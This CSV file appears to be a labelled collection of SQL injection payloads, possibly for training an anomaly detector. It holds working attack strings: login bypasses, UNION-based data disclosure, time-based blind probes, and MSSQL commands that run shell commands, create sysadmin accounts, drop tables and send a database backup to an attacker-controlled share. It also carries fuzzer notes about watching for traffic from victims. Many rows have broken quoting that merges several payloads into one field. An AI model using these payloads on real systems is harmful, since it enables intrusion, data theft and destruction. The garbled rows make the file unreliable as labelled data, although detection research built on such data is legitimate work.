' or ''^',sqli,anom
' or ''*',sqli,anom
'-||0',sqli,anom
-||0,sqli,anom
-,sqli,anom
 ,sqli,anom
&,sqli,anom
^,sqli,anom
*,sqli,anom
" or ""-",sqli,anom
" or "" ",sqli,anom
" or ""&",sqli,anom
" or ""^",sqli,anom
" or ""*",sqli,anom
or true--,sqli,anom
" or true--
' or true--
) or true--",sqli,anom
') or true--,sqli,anom
' or 'x'='x,sqli,anom
') or ('x')=('x,sqli,anom
')) or (('x'))=(('x,sqli,anom
" or x""=""x",sqli,anom
") or (x"")=(""x",sqli,anom
")) or ((x""))=((""x",sqli,anom
or 2 like 2,sqli,anom
or 1=1,sqli,anom
or 1=1--,sqli,anom
or 1=1#,sqli,anom
or 1=1/*,sqli,anom
admin' --,sqli,anom
admin' -- -,sqli,anom
admin' #,sqli,anom
admin'/*,sqli,anom
admin' or '2' LIKE '1,sqli,anom
admin' or 2 LIKE 2--,sqli,anom
admin' or 2 LIKE 2#,sqli,anom
admin') or 2 LIKE 2#,sqli,anom
admin') or 2 LIKE 2--,sqli,anom
admin') or ('2' LIKE '2,sqli,anom
admin') or ('2' LIKE '2'#,sqli,anom
admin') or ('2' LIKE '2'/*,sqli,anom
admin' or '1'='1,sqli,anom
admin' or '1'='1'--,sqli,anom
admin' or '1'='1'#,sqli,anom
admin' or '1'='1'/*,sqli,anom
admin'or 1=1 or ''=',sqli,anom
admin' or 1=1,sqli,anom
admin' or 1=1--,sqli,anom
admin' or 1=1#,sqli,anom
admin' or 1=1/*,sqli,anom
admin') or ('1'='1,sqli,anom
admin') or ('1'='1'--,sqli,anom
admin') or ('1'='1'#,sqli,anom
admin') or ('1'='1'/*,sqli,anom
admin') or '1'='1,sqli,anom
admin') or '1'='1'--,sqli,anom
admin') or '1'='1'#,sqli,anom
admin') or '1'='1'/*,sqli,anom
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
"admin"" --",sqli,anom
"admin"" #",sqli,anom
"admin""/*",sqli,anom
"admin"" or ""1""=""1",sqli,anom
"admin"" or ""1""=""1""--",sqli,anom
"admin"" or ""1""=""1""#",sqli,anom
"admin"" or ""1""=""1""/*",sqli,anom
"admin""or 1=1 or """"=""",sqli,anom
"admin"" or 1=1",sqli,anom
"admin"" or 1=1--",sqli,anom
"admin"" or 1=1#",sqli,anom
"admin"" or 1=1/*",sqli,anom
"admin"") or (""1""=""1",sqli,anom
"admin"") or (""1""=""1""--",sqli,anom
"admin"") or (""1""=""1""#",sqli,anom
"admin"") or (""1""=""1""/*",sqli,anom
"admin"") or ""1""=""1",sqli,anom
"admin"") or ""1""=""1""--",sqli,anom
"admin"") or ""1""=""1""#",sqli,anom
"admin"") or ""1""=""1""/*",sqli,anom
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
"SELECT * FROM admin WHERE pass = '.md5($password,true).""'""",sqli,anom
"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",sqli,anom
?id=1%09and%091=1%09--,sqli,anom
?id=1%0Dand%0D1=1%0D--,sqli,anom
?id=1%0Cand%0C1=1%0C--,sqli,anom
?id=1%0Band%0B1=1%0B--,sqli,anom
?id=1%0Aand%0A1=1%0A--,sqli,anom
?id=1%A0and%A01=1%A0--,sqli,anom
?id=1/*comment*/and/**/1=1/**/--,sqli,anom
?id=(1)and(1)=(1)--,sqli,anom
"LIMIT 0,1 ",sqli,anom
"SUBSTR('SQL',1,1)",sqli,anom
"SELECT 1,2,3,4",sqli,anom
"?id=1 and substring(version(),1,1)like(5)",sqli,anom
"?id=1 and substring(version(),1,1)not in(4,3)",sqli,anom
"?id=1 and substring(version(),1,1)in(4,3)",sqli,anom
"?id=1 and substring(version(),1,1) between 3 and 4",sqli,anom
?id=1 AND 1=1,sqli,anom
?id=1 AnD 1=1,sqli,anom
?id=1 aNd 1=1,sqli,anom
AND   -> &&,sqli,anom
OR    -> ||,sqli,anom
"=     -> LIKE,REGEXP, BETWEEN, not < and not >",sqli,anom
> X   -> not between 0 and X,sqli,anom
WHERE -> HAVING,sqli,anom
select * from mysql.innodb_table_stats;,sqli,anom
show tables in dvwa;,sqli,anom
select @@innodb_version;,sqli,anom
==,sqli,anom
=,sqli,anom
',sqli,anom
' --,sqli,anom
' #,sqli,anom
' –,sqli,anom
'--,sqli,anom
'/*,sqli,anom
'#,sqli,anom
" --
 #",sqli,anom
"/*
' and 1='1
' and a='a
 or 1=1
 or true
' or ''='
 or """"=""",sqli,anom
1?) and '1?='1–,sqli,anom
"' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
" AND 1=0 UNION ALL SELECT "", 81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
 and 1=1,sqli,anom
 and 1=1–,sqli,anom
' and 'one'='one,sqli,anom
' and 'one'='one–,sqli,anom
' group by password having 1=1--,sqli,anom
' group by userid having 1=1--,sqli,anom
' group by username having 1=1--,sqli,anom
 like '%',sqli,anom
 or 0=0 --,sqli,anom
 or 0=0 #,sqli,anom
 or 0=0 –,sqli,anom
' or         0=0 #,sqli,anom
' or 0=0 --,sqli,anom
' or 0=0 #,sqli,anom
' or 0=0 –,sqli,anom
" or 0=0 --
 or 0=0 #",sqli,anom
" or 0=0 –
%' or '0'='0
 or 1=1
 or 1=1--
 or 1=1/*
 or 1=1#
 or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1?='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1--
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1?
 or ""1""=""1",sqli,anom
" or 1""=""1""--",sqli,anom
" or 1""=""1""/*",sqli,anom
" or 1""=""1""#",sqli,anom
" or 1=1
 or 1=1 --",sqli,anom
" or 1=1 –
 or 1=1--",sqli,anom
" or 1=1/*
 or 1=1#",sqli,anom
" or 1=1–
) or ""1""=""1",sqli,anom
") or 1""=""1""--",sqli,anom
") or 1""=""1""/*",sqli,anom
") or 1""=""1""#",sqli,anom
") or (1""=""1",sqli,anom
") or (1""=""1""--",sqli,anom
") or (1""=""1""/*",sqli,anom
") or (1""=""1""#",sqli,anom
) or '1?='1–,sqli,anom
) or ('1?='1–,sqli,anom
' or 1=1 LIMIT 1;#,sqli,anom
'or 1=1 or ''=',sqli,anom
"or 1=1 or ""=",sqli,anom
' or 'a'='a,sqli,anom
' or a=a--,sqli,anom
' or a=a–,sqli,anom
') or ('a'='a,sqli,anom
" or a""=""a",sqli,anom
") or (a""=""a",sqli,anom
"') or ('a'='a and hi"") or (""a""=""a",sqli,anom
' or 'one'='one,sqli,anom
' or 'one'='one–,sqli,anom
' or uid like '%,sqli,anom
' or uname like '%,sqli,anom
' or userid like '%,sqli,anom
' or user like '%,sqli,anom
' or username like '%,sqli,anom
' or 'x'='x,sqli,anom
') or ('x'='x,sqli,anom
" or x""=""x",sqli,anom
' OR 'x'='x'#;,sqli,anom
'=' 'or' and '=' 'or',sqli,anom
"' UNION ALL SELECT 1, @@version;#",sqli,anom
"' UNION ALL SELECT system_user(),user();#",sqli,anom
"' UNION select table_schema,table_name FROM information_Schema.tables;#",sqli,anom
"admin' and substring(password/text(),1,1)='7",sqli,anom
"' and substring(password/text(),1,1)='7",sqli,anom
' or 1=1 limit 1 -- -+,sqli,anom
"'=""or'",sqli,anom
waitfor delay '0:0:20' /* ,sqli,anom
 waitfor delay '0:0:20' --,sqli,anom
' waitfor delay '0:0:20' /* ,sqli,anom
' waitfor delay '0:0:20' --,sqli,anom
" waitfor delay '0:0:20' /* 
 waitfor delay '0:0:20' --",sqli,anom
) waitfor delay '0:0:20' /* ,sqli,anom
) waitfor delay '0:0:20' --,sqli,anom
)) waitfor delay '0:0:20' /* ,sqli,anom
)) waitfor delay '0:0:20' --,sqli,anom
))) waitfor delay '0:0:20' /* ,sqli,anom
))) waitfor delay '0:0:20' --,sqli,anom
)))) waitfor delay '0:0:20' /* ,sqli,anom
)))) waitfor delay '0:0:20' --,sqli,anom
))))) waitfor delay '0:0:20' --,sqli,anom
)))))) waitfor delay '0:0:20' --,sqli,anom
') waitfor delay '0:0:20' /* ,sqli,anom
') waitfor delay '0:0:20' --,sqli,anom
") waitfor delay '0:0:20' /* 
) waitfor delay '0:0:20' --",sqli,anom
')) waitfor delay '0:0:20' /* ,sqli,anom
')) waitfor delay '0:0:20' --,sqli,anom
")) waitfor delay '0:0:20' /* 
)) waitfor delay '0:0:20' --",sqli,anom
'))) waitfor delay '0:0:20' /* ,sqli,anom
'))) waitfor delay '0:0:20' --,sqli,anom
"))) waitfor delay '0:0:20' /* 
))) waitfor delay '0:0:20' --",sqli,anom
')))) waitfor delay '0:0:20' /* ,sqli,anom
')))) waitfor delay '0:0:20' --,sqli,anom
")))) waitfor delay '0:0:20' /* 
)))) waitfor delay '0:0:20' --",sqli,anom
'))))) waitfor delay '0:0:20' /* ,sqli,anom
'))))) waitfor delay '0:0:20' --,sqli,anom
"))))) waitfor delay '0:0:20' /* 
))))) waitfor delay '0:0:20' --",sqli,anom
')))))) waitfor delay '0:0:20' /* ,sqli,anom
')))))) waitfor delay '0:0:20' --,sqli,anom
")))))) waitfor delay '0:0:20' /* 
)))))) waitfor delay '0:0:20' --",sqli,anom
# you will need to customize/modify some of the vaules in the queries for best effect,sqli,anom
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,sqli,anom
'create user name identified by 'pass123' --,sqli,anom
'create user name identified by pass123 temporary tablespace temp default tablespace users; ,sqli,anom
' ; drop table temp --,sqli,anom
"'exec sp_addlogin 'name' , 'password' --",sqli,anom
"' exec sp_addsrvrolemember 'name' , 'sysadmin' --",sqli,anom
"' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",sqli,anom
' grant connect to name; grant resource to name; --,sqli,anom
"' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",sqli,anom
' or 1=1 --,sqli,anom
' union (select @@version) --,sqli,anom
"' union (select NULL, (select @@version)) --",sqli,anom
"' union (select NULL, NULL, (select @@version)) --",sqli,anom
"' union (select NULL, NULL, NULL,  (select @@version)) --",sqli,anom
"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",sqli,anom
"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",sqli,anom
# ms-sqli info disclosure payload fuzzfile,sqli,anom
# replace regex with your fuzzer for best results <attackerip> <sharename>,sqli,anom
"# run wireshark or tcpdump, look for incoming smb or icmp packets from victim",sqli,anom
# might need to terminate payloads with ;--,sqli,anom
select @@version,sqli,anom
select @@servernamee,sqli,anom
select @@microsoftversione,sqli,anom
select * from master..sysserverse,sqli,anom
select * from sysusers,sqli,anom
exec master..xp_cmdshell 'ipconfig+/all',sqli,anom
exec master..xp_cmdshell 'net+view',sqli,anom
exec master..xp_cmdshell 'net+users',sqli,anom
exec master..xp_cmdshell 'ping+<attackerip>',sqli,anom
BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',sqli,anom
"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'"" select * from myfile""--",sqli,anom
1'1,sqli,anom
1 exec sp_ (or exec xp_),sqli,anom
1 and 1=1,sqli,anom
1' and 1=(select count(*) from tablenames); --,sqli,anom
1 or 1=1,sqli,anom
1' or '1'='1,sqli,anom
"and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
" and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
" and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
"' and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
"' and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
"' and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
" and 0=benchmark(3000000,MD5(1))%20/*
 and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
" and 0=benchmark(3000000,MD5(1))%20%23
) and 0=benchmark(3000000,MD5(1))%20/*
) and 0=benchmark(3000000,MD5(1))%20--
) and 0=benchmark(3000000,MD5(1))%20%23
)) and 0=benchmark(3000000,MD5(1))%20/*
)) and 0=benchmark(3000000,MD5(1))%20--
)) and 0=benchmark(3000000,MD5(1))%20%23
))) and 0=benchmark(3000000,MD5(1))%20/*
))) and 0=benchmark(3000000,MD5(1))%20--
))) and 0=benchmark(3000000,MD5(1))%20%23
)))) and 0=benchmark(3000000,MD5(1))%20/*
)))) and 0=benchmark(3000000,MD5(1))%20--
)))) and 0=benchmark(3000000,MD5(1))%20%23
') and 0=benchmark(3000000,MD5(1))%20/*
') and 0=benchmark(3000000,MD5(1))%20--
') and 0=benchmark(3000000,MD5(1))%20%23
) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
") and 0=benchmark(3000000,MD5(1))%20--
) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
"')) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
"')) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
"')) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
")) and 0=benchmark(3000000,MD5(1))%20/*
)) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
")) and 0=benchmark(3000000,MD5(1))%20%23
'))) and 0=benchmark(3000000,MD5(1))%20/*
'))) and 0=benchmark(3000000,MD5(1))%20--
'))) and 0=benchmark(3000000,MD5(1))%20%23
))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
"))) and 0=benchmark(3000000,MD5(1))%20--
))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
"')))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
"')))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
"')))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
")))) and 0=benchmark(3000000,MD5(1))%20/*
)))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
